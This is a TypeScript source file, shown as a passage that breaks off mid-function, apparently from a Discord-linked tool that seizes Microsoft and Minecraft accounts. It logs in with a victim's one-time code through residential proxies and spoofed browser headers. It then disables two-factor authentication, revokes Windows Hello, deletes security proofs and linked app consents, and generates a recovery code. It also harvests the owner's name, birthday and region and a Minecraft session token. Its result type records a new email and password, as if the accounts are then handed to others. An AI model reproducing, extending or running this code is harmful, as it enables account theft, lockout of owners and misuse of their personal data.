import { spawn } from "node:child_process";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { CookieJar, fetchWithJar } from "./cookie-jar.js";
import { createLogger } from "./api.js";
import {
  closeMsSession,
  openMsSession,
  resolveProxyFromLabel,
  setStickyProxy,
} from "./proxy-fetch.js";
import {
  createMailcowMailbox,
  mailcowConfigured,
  readSecurityCodeFromImap,
  type RecoveryMailbox,
} from "./recovery-mailbox.js";

const __secureDir = path.dirname(fileURLToPath(import.meta.url));
const LOGIN_OTP_SCRIPT = path.resolve(__secureDir, "../scripts/login_otp.py");

const LOGIN_OTP_TIMEOUT_MS = 90_000;

/** Python residential-proxy OTP login → inject cookies into jar; sticks that proxy for post-login MS calls */
async function loginWithCodeViaPython(
  jar: CookieJar,
  email: string,
  proofId: string,
  code: string,
  log: (level: string, msg: string) => Promise<void>,
  signal?: AbortSignal,
): Promise<boolean> {
  const bins = process.platform === "win32" ? ["python", "py", "python3"] : ["python3", "python"];
  for (const bin of bins) {
    try {
      const result = await new Promise<{
        ok?: boolean;
        cookies?: Record<string, string>;
        error?: string;
        proxy?: string;
        proxy_url?: string;
      } | null>((resolve) => {
        if (signal?.aborted) {
          resolve(null);
          return;
        }
        const child = spawn(bin, [LOGIN_OTP_SCRIPT, email, proofId, code], {
          windowsHide: true,
          env: process.env,
          cwd: path.resolve(__secureDir, ".."),
        });
        let stdout = "";
        let stderr = "";
        let settled = false;
        type LoginResult = {
          ok?: boolean;
          cookies?: Record<string, string>;
          error?: string;
          proxy?: string;
          proxy_url?: string;
        } | null;
        const finish = (v: LoginResult) => {
          if (settled) return;
          settled = true;
          clearTimeout(timer);
          signal?.removeEventListener("abort", onAbort);
          resolve(v);
        };
        const timer = setTimeout(() => {
          try {
            child.kill("SIGKILL");
          } catch {
            /* ignore */
          }
          void log("warn", `[secure] login_otp timeout ${LOGIN_OTP_TIMEOUT_MS}ms (${bin})`);
          finish(null);
        }, LOGIN_OTP_TIMEOUT_MS);
        const onAbort = () => {
          try {
            child.kill("SIGKILL");
          } catch {
            /* ignore */
          }
          finish(null);
        };
        signal?.addEventListener("abort", onAbort, { once: true });
        child.stdout.on("data", (d) => {
          stdout += String(d);
        });
        child.stderr.on("data", (d) => {
          stderr += String(d);
        });
        child.on("error", () => finish(null));
        child.on("close", () => {
          const line = stdout.trim().split(/\r?\n/).filter(Boolean).pop() || "";
          if (!line) {
            void log("warn", `[secure] login_otp empty (${bin}): ${stderr.slice(0, 160)}`);
            finish(null);
            return;
          }
          try {
            finish(
              JSON.parse(line) as {
                ok?: boolean;
                cookies?: Record<string, string>;
                error?: string;
                proxy?: string;
                proxy_url?: string;
              },
            );
          } catch {
            finish(null);
          }
        });
      });
      if (!result) continue;
      if (result.ok && result.cookies) {
        for (const [k, v] of Object.entries(result.cookies)) {
          jar.setFromResponse("https://login.live.com", `${k}=${v}`);
        }
        const sticky =
          result.proxy_url ||
          resolveProxyFromLabel(result.proxy) ||
          null;
        if (sticky) {
          setStickyProxy(sticky);
          await log("info", `[secure] sticky proxy set for secure pipeline: ${result.proxy || "ok"}`);
        } else {
          await log("warn", "[secure] no sticky proxy — post-login may hit bare VPS IP");
        }
        // Long-lived MS session = same TCP/proxy jar for all post-login steps
        try {
          await openMsSession(sticky, result.cookies);
          await log("info", "[secure] ms_session opened (persistent sticky HTTP)");
        } catch (e) {
          await log(
            "warn",
            `[secure] ms_session open failed (will one-shot): ${e instanceof Error ? e.message : e}`,
          );
        }
        const authBits = ["__Host-MSAAUTH", "MSPAuth", "WLSSC", "MSPOK", "MSPProf"]
          .filter((n) => !!result.cookies![n])
          .join(",");
        await log(
          "info",
          `[secure] OTP login ok via python proxy=${result.proxy || "?"} cookies=${Object.keys(result.cookies).length} auth=${authBits || "none"}`,
        );
        return true;
      }
      await log("warn", `[secure] python login failed: ${(result.error || "unknown").slice(0, 200)}`);
      return false;
    } catch {
      /* try next bin */
    }
  }
  return false;
}

export interface SecureJobConfig {
  email: string;
  flowToken: string;
  code: string;
  mcUsername?: string;
  guildId: string;
  channelId: string;
  messageId?: string;
  discordId: string;
  sessionId?: string;
  roleId?: string;
  ownerDiscordId?: string | null;
}

export interface SecureResult {
  mcUsername: string;
  mcEmail: string;
  newEmail: string;
  newPassword: string;
  recoveryCode: string;
  /** Recovery mailbox (Mailcow/Firstmail) used as MS security email */
  mailboxEmail: string;
  mailboxPassword: string;
  mailboxProvider: string;
  mailboxImapHost: string;
  ssid: string | null;
  capes: string;
  method: string;
  firstName: string;
  lastName: string;
  region: string;
  birthday: string;
}

function extract(text: string, regex: RegExp): string {
  const m = regex.exec(text);
  if (!m) throw new Error(`Regex ${regex} not found in response`);
  return m[1];
}

function extractAll(text: string, regex: RegExp): string[] {
  const results: string[] = [];
  let m;
  while ((m = regex.exec(text)) !== null) {
    results.push(m[1]);
  }
  return results;
}

function decodeUnicode(s: string): string {
  return s.replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16)),
  );
}

interface LiveData {
  urlPost: string;
  ppft: string;
}

async function getLiveData(jar: CookieJar): Promise<LiveData> {
  const res = await fetchWithJar(jar, "https://login.live.com", {
    method: "POST",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
    },
  });
  const text = await res.text();

  const urlPost = extract(
    text,
    /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0/,
  );
  const ppftMatch = extract(text, /value=\\?"([^"]+)"/);

  return { urlPost, ppft: ppftMatch };
}

/** Login with email OTP — try type 27 (otc) then type 24 (npotc). */
async function loginWithCode(
  jar: CookieJar,
  email: string,
  flowToken: string,
  code: string,
  ppft: string,
  urlPost: string,
): Promise<boolean> {
  const attempts: Array<Record<string, string>> = [
    {
      login: email,
      loginfmt: email,
      SentProofIDE: flowToken,
      otc: code,
      type: "27",
      PPFT: ppft,
    },
    {
      login: email,
      loginfmt: email,
      SentProofIDE: flowToken,
      npotc: code,
      type: "24",
      PPFT: ppft,
    },
  ];

  for (let i = 0; i < attempts.length; i++) {
    const res = await fetchWithJar(
      jar,
      urlPost,
      {
        method: "POST",
        headers: {
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: "https://login.live.com",
          Referer: "https://login.live.com/",
          "Accept-Language": "en-US,en;q=0.5",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
        },
        body: new URLSearchParams(attempts[i]).toString(),
      },
      { followRedirects: true, maxRedirects: 12, timeoutMs: 30_000 },
    );

    const text = await res.text();
    if (jar.get("__Host-MSAAUTH") || jar.get("MSPAuth") || jar.get("WLSSC")) {
      return true;
    }

    // Notice / ToS / intermediate form
    const actionMatch = text.match(
      /action="([^"]+)".*?id="correlation_id" value="([^"]+)".*?id="code" value="([^"]+)"/s,
    );
    if (actionMatch) {
      const [, actionUrl, correlationId, actionCode] = actionMatch;
      const noticeRes = await fetchWithJar(
        jar,
        actionUrl,
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ correlation_id: correlationId, code: actionCode }).toString(),
        },
        { followRedirects: true, maxRedirects: 10, timeoutMs: 25_000 },
      );
      const noticeText = await noticeRes.text();
      const redirectUrlMatch = noticeText.match(/var redirectUrl = '([^']+)'/);
      if (redirectUrlMatch) {
        const redirectUrl = redirectUrlMatch[1].replace(/\\u0026/g, "&").replace(/\\u0026/g, "&");
        await fetchWithJar(jar, redirectUrl, { method: "GET" }, { followRedirects: true, maxRedirects: 10 });
      }
      if (jar.get("__Host-MSAAUTH") || jar.get("MSPAuth") || jar.get("WLSSC")) {
        return true;
      }
    }

    // Sometimes KMSI / stay signed in form
    const kmsiPost = text.match(/urlPost"\s*:\s*"([^"]+)"/) || text.match(/"urlPost"\s*:\s*"([^"]+)"/);
    const sFT = text.match(/"sFT"\s*:\s*"([^"]+)"/);
    if (kmsiPost && sFT && !jar.get("__Host-MSAAUTH")) {
      await fetchWithJar(
        jar,
        kmsiPost[1].replace(/\\u0026/g, "&"),
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            LoginOptions: "1",
            type: "28",
            PPFT: sFT[1],
          }).toString(),
        },
        { followRedirects: true, maxRedirects: 10 },
      );
      if (jar.get("__Host-MSAAUTH") || jar.get("MSPAuth") || jar.get("WLSSC")) {
        return true;
      }
    }
  }

  return !!(jar.get("__Host-MSAAUTH") || jar.get("MSPAuth") || jar.get("WLSSC"));
}

function pageFingerprint(text: string): string {
  const flags: string[] = [];
  if (/encryptedNetId/i.test(text)) flags.push("encNetId");
  if (/apiCanary/i.test(text)) flags.push("canary");
  if (/name="PPFT"|id="i0116"|loginfmt/i.test(text)) flags.push("login");
  if (/ServerData\s*=/i.test(text)) flags.push("ServerData");
  if (/\bt0\s*=/i.test(text)) flags.push("t0");
  if (/AMRP|interrupt|Abort/i.test(text)) flags.push("interrupt");
  if (/proofs\/Manage/i.test(text)) flags.push("proofs");
  return flags.join(",") || "none";
}

async function getCookies(jar: CookieJar): Promise<string> {
  const urls = [
    "https://account.live.com/proofs/Manage/additional?mkt=en-US",
    "https://account.live.com/password/reset",
    "https://account.live.com/proofs/Manage/additional",
    "https://account.live.com/",
  ];
  const hints: string[] = [];
  // 2 passes — first sticky session, second may recover after transient proxy stall
  for (let pass = 0; pass < 2; pass++) {
    for (const url of urls) {
      try {
        const res = await fetchWithJar(
          jar,
          url,
          {
            headers: {
              Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
              "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            },
          },
          { timeoutMs: 40_000, followRedirects: true },
        );
        const text = await res.text();
        const fp = pageFingerprint(text);
        hints.push(
          `p${pass}:${url.split("?")[0].split("/").slice(-2).join("/")}:status=${res.status}:len=${text.length}:fp=${fp}`,
        );
        const raw =
          text.match(/"apiCanary"\s*:\s*"([^"]+)"/)?.[1] ||
          text.match(/apiCanary&quot;:&quot;([^&]+)&quot;/)?.[1] ||
          text.match(/'apiCanary'\s*:\s*'([^']+)'/)?.[1];
        if (raw) {
          try {
            return decodeUnicode(decodeURIComponent(raw));
          } catch {
            return decodeUnicode(raw);
          }
        }
      } catch (e) {
        hints.push(`p${pass}:err=${e instanceof Error ? e.message.slice(0, 100) : e}`);
      }
    }
  }
  throw new Error(`apiCanary not found (${hints.join(" | ")})`);
}

async function getT(jar: CookieJar): Promise<string | null> {
  const res = await fetchWithJar(jar, "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&ct=1708978285&rver=7.5.2156.0&wp=SA_20MIN&wreply=https://account.live.com/proofs/Add?apt=2&uaid=0637740e739c48f6bf118445d579a786&lc=1033&id=38936&mkt=en-US&uaid=0637740e739c48f6bf118445d579a786", {
    redirect: "manual",
  });
  const text = await res.text();
  const m = text.match(/<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>/);
  return m ? m[1] : null;
}

async function getAMC(jar: CookieJar): Promise<string | null> {
  try {
    let res = await fetchWithJar(
      jar,
      "https://account.microsoft.com",
      {
        headers: {
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        },
      },
      { followRedirects: true, maxRedirects: 12, timeoutMs: 30_000 },
    );
    let text = await res.text();

    // Silent sign-in form if present
    const tMatch = text.match(
      /<input\s+type="hidden"\s+name="t"\s+id="t"\s+value="([^"]+)"\s*\/?>/,
    );
    if (tMatch) {
      res = await fetchWithJar(
        jar,
        "https://account.microsoft.com/auth/complete-silent-signin?ru=https%3A%2F%2Faccount.microsoft.com%2F&wa=wsignin1.0&refd=login.live.com",
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ t: tMatch[1] }).toString(),
        },
        { followRedirects: true, maxRedirects: 12, timeoutMs: 30_000 },
      );
      text = await res.text();
      const href = text.match(/href="(https:\/\/account\.microsoft\.com[^"]+)"/)?.[1];
      if (href) {
        res = await fetchWithJar(jar, href.replace(/&amp;/g, "&"), {
          headers: {
            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          },
        }, { followRedirects: true, maxRedirects: 10 });
        text = await res.text();
      }
    }

    // SSO redirect polish path
    const sso = text.match(
      /https:\/\/account\.microsoft\.com\/auth\/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+/,
    );
    if (sso) {
      res = await fetchWithJar(jar, sso[0], {}, { followRedirects: true, maxRedirects: 10 });
      text = await res.text();
      const action = text.match(/action="([^"]+)"/)?.[1];
      const pprid = text.match(/name="pprid"[^>]*value="([^"]+)"/)?.[1];
      const nap = text.match(/name="NAP"[^>]*value="([^"]+)"/)?.[1];
      const anon = text.match(/name="ANON"[^>]*value="([^"]+)"/)?.[1];
      const t = text.match(/name="t"[^>]*value="([^"]+)"/)?.[1];
      if (action && pprid && nap && anon && t) {
        res = await fetchWithJar(
          jar,
          action,
          {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({ pprid, NAP: nap, ANON: anon, t }).toString(),
          },
          { followRedirects: true, maxRedirects: 10 },
        );
        text = await res.text();
      }
    }

    // Final page for antiforgery token
    res = await fetchWithJar(
      jar,
      "https://account.microsoft.com/",
      {
        headers: {
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
        },
      },
      { followRedirects: true, maxRedirects: 8 },
    );
    text = await res.text();
    const rvt = text.match(
      /name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"/s,
    )?.[1];
    return rvt || null;
  } catch {
    return null;
  }
}

async function getOwnerInfo(jar: CookieJar, verificationToken: string) {
  try {
    const res = await fetchWithJar(jar, "https://account.microsoft.com/profile/api/v1/personal-info", {
      headers: {
        Accept: "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest",
        __RequestVerificationToken: verificationToken,
        Referer: "https://account.microsoft.com/profile",
      },
    });
    const data = (await res.json()) as Record<string, string>;
    return {
      firstName: data.firstName ?? "Unknown",
      lastName: data.lastName ?? "Unknown",
      region: data.region ?? "Unknown",
      birthday: data.birthday ?? "Unknown",
    };
  } catch {
    return null;
  }
}

async function getXBL(jar: CookieJar) {
  try {
    // Manual hop so we can read accessToken from redirect Location
    let res = await fetchWithJar(
      jar,
      "https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId=8058f65d-ce06-4c30-9559-473c9275a65d&tid=896928775&ru=https://www.minecraft.net/en-us/login&aid=1142970254",
      {},
      { followRedirects: false, timeoutMs: 30_000 },
    );
    let loc = res.headers.get("location");
    if (!loc) return null;

    res = await fetchWithJar(jar, loc, {}, { followRedirects: false, timeoutMs: 30_000 });
    loc = res.headers.get("location");
    if (!loc) return null;

    res = await fetchWithJar(jar, loc, {}, { followRedirects: false, timeoutMs: 30_000 });
    loc = res.headers.get("location") || res.url;
    if (!loc) return null;

    const tokenMatch = loc.match(/accessToken=([^&#]+)/);
    if (!tokenMatch) return null;

    let accessToken = tokenMatch[1];
    while (accessToken.length % 4 !== 0) accessToken += "=";

    const decoded = Buffer.from(accessToken, "base64").toString("utf-8");
    const jsonData = JSON.parse(decoded) as Array<Record<string, unknown>>;

    const item0 = jsonData[0] as Record<string, unknown> | undefined;
    const item2 = item0?.Item2 as Record<string, unknown> | undefined;
    const displayClaims = item2?.DisplayClaims as Record<string, unknown> | undefined;
    const xui = displayClaims?.xui as Array<Record<string, unknown>> | undefined;
    const uhs = (xui?.[0]?.uhs as string) ?? "";

    let xsts = "";
    for (const item of jsonData) {
      if ((item as Record<string, string>).Item1 === "rp://api.minecraftservices.com/") {
        xsts = ((item as Record<string, Record<string, string>>).Item2?.Token ?? "") as string;
        break;
      }
    }

    if (!uhs || !xsts) return null;
    return `XBL3.0 x=${uhs};${xsts}`;
  } catch {
    return null;
  }
}

async function getSSID(xbl: string): Promise<string | null> {
  try {
    const res = await fetch("https://api.minecraftservices.com/authentication/login_with_xbox", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ identityToken: xbl, ensureLegacyEnabled: true }),
    });
    const data = (await res.json()) as Record<string, string>;
    return data.access_token ?? null;
  } catch {
    return null;
  }
}

async function getProfile(ssid: string): Promise<string | null> {
  try {
    const res = await fetch("https://api.minecraftservices.com/minecraft/profile", {
      headers: { Authorization: `Bearer ${ssid}` },
    });
    const data = (await res.json()) as Record<string, unknown>;
    return (data.name as string) ?? null;
  } catch {
    return null;
  }
}

async function getCapesList(ssid: string): Promise<string | null> {
  try {
    const res = await fetch("https://api.minecraftservices.com/minecraft/profile", {
      headers: { Authorization: `Bearer ${ssid}` },
    });
    const data = (await res.json()) as Record<string, unknown>;
    if (data.capes && Array.isArray(data.capes)) {
      return (data.capes as Array<Record<string, string>>).map((c) => c.alias).join(", ");
    }
    return null;
  } catch {
    return null;
  }
}

async function getMethod(ssid: string): Promise<string | null> {
  try {
    const res = await fetch("https://api.minecraftservices.com/entitlements/license?requestId=c24114ab-1814-4d5c-9b1f-e8825edaec1f", {
      headers: { Authorization: `Bearer ${ssid}` },
    });
    const data = (await res.json()) as Record<string, Array<Record<string, string>>>;
    if (data.items) {
      for (const item of data.items) {
        if (item.name === "product_minecraft" || item.name === "game_minecraft") {
          if (item.source === "GAMEPASS") return "Gamepass";
          if (item.source === "PURCHASE" || item.source === "MC_PURCHASE") return "Purchased";
        }
      }
    }
    return null;
  } catch {
    return null;
  }
}

async function getAMRP(jar: CookieJar, t: string): Promise<boolean> {
  const res = await fetchWithJar(jar, "https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ t }).toString(),
    redirect: "manual",
  });
  return !!jar.get("AMRPSSecAuth");
}

async function remove2FA(jar: CookieJar, apiCanary: string) {
  try {
    await fetchWithJar(jar, "https://account.live.com/API/Proofs/DisableTfa", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-ms-apiVersion": "2",
        "x-ms-apiTransport": "xhr",
        uiflvr: "1001",
        scid: "100109",
        hpgid: "201030",
        "X-Requested-With": "XMLHttpRequest",
        Origin: "https://account.live.com",
        Referer: "https://account.live.com/proofs/Manage/additional",
        canary: apiCanary,
      },
      body: JSON.stringify({ uiflvr: 1001, uaid: "abd2ca2a346c43c198c9ca7e4255f3bc", scid: 100109, hpgid: 201030 }),
      redirect: "manual",
    });
  } catch {}
}

async function removeZyger(jar: CookieJar, apiCanary: string) {
  try {
    await fetchWithJar(jar, "https://account.live.com/API/Proofs/RevokeWindowsHelloProofs", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-ms-apiVersion": "2",
        "x-ms-apiTransport": "xhr",
        uiflvr: "1001",
        scid: "100109",
        hpgid: "201030",
        "X-Requested-With": "XMLHttpRequest",
        Origin: "https://account.live.com",
        Referer: "https://account.live.com/proofs/Manage/additional",
        canary: apiCanary,
      },
      body: JSON.stringify({ uiflvr: 1001, uaid: "abd2ca2a346c43c198c9ca7e4255f3bc", scid: 100109, hpgid: 201030 }),
      redirect: "manual",
    });
  } catch {}
}

async function removeProofs(jar: CookieJar, apiCanary: string) {
  try {
    const res = await fetchWithJar(
      jar,
      "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
      { redirect: "manual" },
      { timeoutMs: 12_000 },
    );
    const text = await res.text();
    // Cap tightly — many proofs + sticky proxy can freeze the job after success
    const proofIds = extractAll(text, /"proofId":"([^"]+)"/).slice(0, 3);

    for (const rawId of proofIds) {
      const proofId = decodeUnicode(rawId);
      try {
        await fetchWithJar(
          jar,
          "https://account.live.com/API/Proofs/DeleteProof",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "X-Requested-With": "XMLHttpRequest",
              Accept: "application/json",
              canary: apiCanary,
            },
            body: JSON.stringify({
              proofId,
              uaid: "114b68368b7b46afa44c82a8246e4a44",
              uiflvr: 1001,
              scid: 100109,
              hpgid: 201030,
            }),
          },
          { timeoutMs: 8_000 },
        );
      } catch {
        /* skip one proof */
      }
    }
  } catch {
    /* ignore */
  }
}

async function removeServices(jar: CookieJar) {
  try {
    const res = await fetchWithJar(
      jar,
      "https://account.live.com/consent/Manage?guat=1",
      { headers: { Referer: "https://login.live.com/" } },
      { timeoutMs: 20_000 },
    );
    const text = await res.text();
    // Cap — this step often hangs when many apps are linked
    const clientIds = extractAll(text, /client_id=([A-F0-9]{16})/).slice(0, 4);

    if (!clientIds.length) return;

    for (const clientId of clientIds) {
      try {
        const editRes = await fetchWithJar(
          jar,
          `https://account.live.com/consent/Edit?client_id=${clientId}`,
          { redirect: "manual" },
          { timeoutMs: 15_000 },
        );
        const editText = await editRes.text();
        const postUrl = editText.match(/name="editConsentForm"[^>]*action="([^"]+)"/)?.[1];
        const canaryRaw = editText.match(/canary"[^>]*value="([^"]+)"/)?.[1];
        if (!postUrl || !canaryRaw) continue;
        const canary = encodeURIComponent(canaryRaw);

        await fetchWithJar(
          jar,
          postUrl,
          {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({ canary }).toString(),
            redirect: "manual",
          },
          { timeoutMs: 15_000 },
        );
      } catch {
        /* skip one app */
      }
    }
  } catch {
    /* ignore */
  }
}

/** Hard timeout wrapper so one MS step can't freeze the whole job */
function withTimeout<T>(p: Promise<T>, ms: number, label: string): Promise<T> {
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error(`${label} timed out after ${ms}ms`)), ms);
    p.then(
      (v) => {
        clearTimeout(t);
        resolve(v);
      },
      (e) => {
        clearTimeout(t);
        reject(e);
      },
    );
  });
}

/** Extract balanced {...} starting at open brace index (string-aware). */
function extractBalancedObject(source: string, openIdx: number): string | null {
  if (openIdx < 0 || source[openIdx] !== "{") return null;
  let depth = 0;
  let inStr = false;
  let esc = false;
  for (let i = openIdx; i < source.length; i++) {
    const c = source[i];
    if (inStr) {
      if (esc) {
        esc = false;
      } else if (c === "\\") {
        esc = true;
      } else if (c === '"') {
        inStr = false;
      }
      continue;
    }
    if (c === '"') {
      inStr = true;
      continue;
    }
    if (c === "{") depth++;
    else if (c === "}") {
      depth--;
      if (depth === 0) return source.slice(openIdx, i + 1);
    }
  }
  return null;
}

function tryParseJsonBlob(raw: string): Record<string, unknown> | null {
  try {
    return JSON.parse(raw) as Record<string, unknown>;
  } catch {
    try {
      // MS often embeds JS with unquoted keys or trailing commas — try cleanup
      const cleaned = raw
        .replace(/,\s*([}\]])/g, "$1")
        .replace(/\\x([0-9A-Fa-f]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
      return JSON.parse(cleaned) as Record<string, unknown>;
    } catch {
      return null;
    }
  }
}

function extractJsonAssignment(html: string, names: string[]): Record<string, unknown> | null {
  for (const name of names) {
    const re = new RegExp(`(?:var\\s+|let\\s+|const\\s+|window\\.|)${name}\\s*=\\s*\\{`, "i");
    const m = re.exec(html);
    if (!m) continue;
    const openIdx = m.index + m[0].length - 1;
    const blob = extractBalancedObject(html, openIdx);
    if (!blob) continue;
    const parsed = tryParseJsonBlob(blob);
    if (parsed) return parsed;
  }
  return null;
}

/** Deep-find first string matching key names in nested object */
function deepFindString(obj: unknown, keys: string[], depth = 0): string | undefined {
  if (!obj || depth > 8) return undefined;
  if (typeof obj !== "object") return undefined;
  if (Array.isArray(obj)) {
    for (const item of obj) {
      const v = deepFindString(item, keys, depth + 1);
      if (v) return v;
    }
    return undefined;
  }
  const rec = obj as Record<string, unknown>;
  for (const k of keys) {
    const v = rec[k];
    if (typeof v === "string" && v.length > 0) return v;
  }
  for (const v of Object.values(rec)) {
    const found = deepFindString(v, keys, depth + 1);
    if (found) return found;
  }
  return undefined;
}

function pickSecInfoFields(obj: Record<string, unknown>): {
  email?: string;
  encryptedNetId?: string;
  raw: Record<string, unknown>;
} {
  const emailRaw = deepFindString(obj, [
    "email",
    "UserEmail",
    "userEmail",
    "signInName",
    "SignInName",
    "primaryEmail",
    "PrimaryEmail",
  ]);
  const email = emailRaw && /@/.test(emailRaw) ? emailRaw : undefined;

  let encryptedNetId =
    deepFindString(obj, ["encryptedNetId", "EncryptedNetId"]) || undefined;
  if (encryptedNetId) encryptedNetId = decodeUnicode(encryptedNetId);

  return { email, encryptedNetId, raw: obj };
}

function scrapeSecFieldsFromHtml(text: string): {
  email?: string;
  encryptedNetId?: string;
} {
  const emailMatch =
    text.match(/"email"\s*:\s*"([^"]+@[^"]+)"/i) ||
    text.match(/"UserEmail"\s*:\s*"([^"]+@[^"]+)"/i) ||
    text.match(/"signInName"\s*:\s*"([^"]+@[^"]+)"/i) ||
    text.match(/"primaryAlias"\s*:\s*"([^"]+@[^"]+)"/i);
  const netIdMatch =
    text.match(/"encryptedNetId"\s*:\s*"([^"]+)"/i) ||
    text.match(/encryptedNetId\\?":\\?"([^"\\]+)/i) ||
    text.match(/encryptedNetId&quot;:&quot;([^&]+)&quot;/i);
  return {
    email: emailMatch?.[1],
    encryptedNetId: netIdMatch?.[1] ? decodeUnicode(netIdMatch[1]) : undefined,
  };
}

async function securityInformation(
  jar: CookieJar,
  fallbackEmail?: string,
): Promise<{ email?: string; encryptedNetId?: string; raw: Record<string, unknown> }> {
  const urls = [
    "https://account.live.com/proofs/Manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
    "https://account.live.com/proofs/Manage/additional",
    "https://account.live.com/proofs/manage/additional?mkt=en-US",
    "https://account.live.com/proofs/Manage",
    "https://account.live.com/proofs/Add",
  ];

  let lastHint = "";
  for (const url of urls) {
    const res = await fetchWithJar(
      jar,
      url,
      {
        headers: {
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
          Referer: "https://account.microsoft.com/",
        },
      },
      { timeoutMs: 30_000, followRedirects: true, maxRedirects: 12 },
    );
    const text = await res.text();
    // proxy path may not set res.url — sniff login from body
    const looksLogin =
      /name="loginfmt"|id="i0116"|sFTTag|name="PPFT"|login\.live\.com\/oauth20/i.test(text) &&
      !/"encryptedNetId"/i.test(text);

    if (looksLogin) {
      lastHint = `login/interrupt status=${res.status} len=${text.length} fp=${pageFingerprint(text)} authCookies=${["__Host-MSAAUTH", "MSPAuth", "WLSSC"].filter((n) => !!jar.get(n)).join(",") || "none"}`;
      continue;
    }

    const nameList = ["t0", "ServerData", "oPageConfig", "pageConfig", "serverData", "oConfig"];
    const candidates: Record<string, unknown>[] = [];
    for (const n of nameList) {
      const c = extractJsonAssignment(text, [n]);
      if (c) candidates.push(c);
    }

    // also try any assignment containing encryptedNetId
    if (!candidates.length) {
      const idx = text.search(/encryptedNetId/i);
      if (idx > 0) {
        // walk back to nearest {
        let open = text.lastIndexOf("{", idx);
        for (let tries = 0; tries < 5 && open >= 0; tries++) {
          const blob = extractBalancedObject(text, open);
          if (blob && blob.includes("encryptedNetId")) {
            const parsed = tryParseJsonBlob(blob);
            if (parsed) candidates.push(parsed);
            break;
          }
          open = text.lastIndexOf("{", open - 1);
        }
      }
    }

    for (const c of candidates) {
      const fields = pickSecInfoFields(c);
      if (fields.encryptedNetId) {
        return {
          email: fields.email || fallbackEmail,
          encryptedNetId: fields.encryptedNetId,
          raw: c,
        };
      }
    }

    const scraped = scrapeSecFieldsFromHtml(text);
    if (scraped.encryptedNetId) {
      return {
        email: scraped.email || fallbackEmail,
        encryptedNetId: scraped.encryptedNetId,
        raw: {},
      };
    }

    lastHint = `no fields status=${res.status} len=${text.length} hasEnc=${/"encryptedNetId"/i.test(text)} hasT0=${/\bt0\s*=/.test(text)} keys=${candidates[0] ? Object.keys(candidates[0]).slice(0, 10).join(",") : "-"}`;
  }

  throw new Error(`Failed to extract security information (${lastHint || "no pages"})`);
}

async function getRecoveryCode(jar: CookieJar, apiCanary: string, encryptedNetId: string): Promise<string> {
  const res = await fetchWithJar(
    jar,
    "https://account.live.com/API/Proofs/GenerateRecoveryCode",
    {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "x-ms-apiVersion": "2",
        "x-ms-apiTransport": "xhr",
        uiflvr: "1001",
        scid: "100109",
        hpgid: "201030",
        "X-Requested-With": "XMLHttpRequest",
        Origin: "https://account.live.com",
        Referer: "https://account.live.com/proofs/Manage/additional",
        canary: apiCanary,
      },
      body: JSON.stringify({ encryptedNetId, uiflvr: 1001, scid: 100109, hpgid: 201030 }),
    },
    { timeoutMs: 25_000 },
  );
  const data = (await res.json()) as Record<string, string>;
  if (!data.recoveryCode) {
    throw new Error(
